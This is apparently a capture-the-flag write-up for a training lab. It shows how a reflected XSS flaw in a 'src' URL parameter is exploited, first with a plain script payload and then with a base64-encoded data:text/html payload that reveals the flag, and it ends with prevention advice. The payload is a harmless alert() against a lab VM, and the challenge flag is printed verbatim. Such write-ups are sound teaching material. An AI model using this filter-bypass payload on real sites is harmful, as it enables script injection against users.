# Reflected XSS
- a type of security vulnerability where an attacker can inject malicious scripts into content that is then served to other users
- when a user visits the affected web page, the malicious script is executed in their browser
- the malicious script is not stored on the server; instead, it is part of a request sent to the server and then reflected back to the user in the server's response
- https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting

<b>keywords</b>: XSS advanced<br>
<b>attacked site</b>: http://borntosec.42/?page=media&src=nsa

## Exploit
One of the images on the main page contains a hyperlink that leads to a different subsite:
``` html
http://borntosec.42/?page=media&src=nsa
```
When we intercept the GET request to this subsite using <code>Burp Suite</code>, we notice that the <code>&src=</code> parameter can be manipulated:
``` http
GET /?page=media&src=nsa HTTP/1.1
Host: 192.168.56.106
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
```
We attempt to inject a JS payload into the URL:
``` http
GET /?page=media&src=data:text/html;<script>alert('XSS')</script> HTTP/1.1
Host: 192.168.56.106
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
```
This approach does not work, so we try encoding the payload in base64 directly using <code>Burp Suite</code>:
``` http
GET /?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: 192.168.56.106
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
```
Accessing the URL with the encoded payload triggers the JS and reveals the flag:
```
The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```

## Flag
928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

## Exploit prevention
- validate user input
- encode output to prevent the browser from interpreting it as executable code
- disable inline JS
- validate and encode URLs
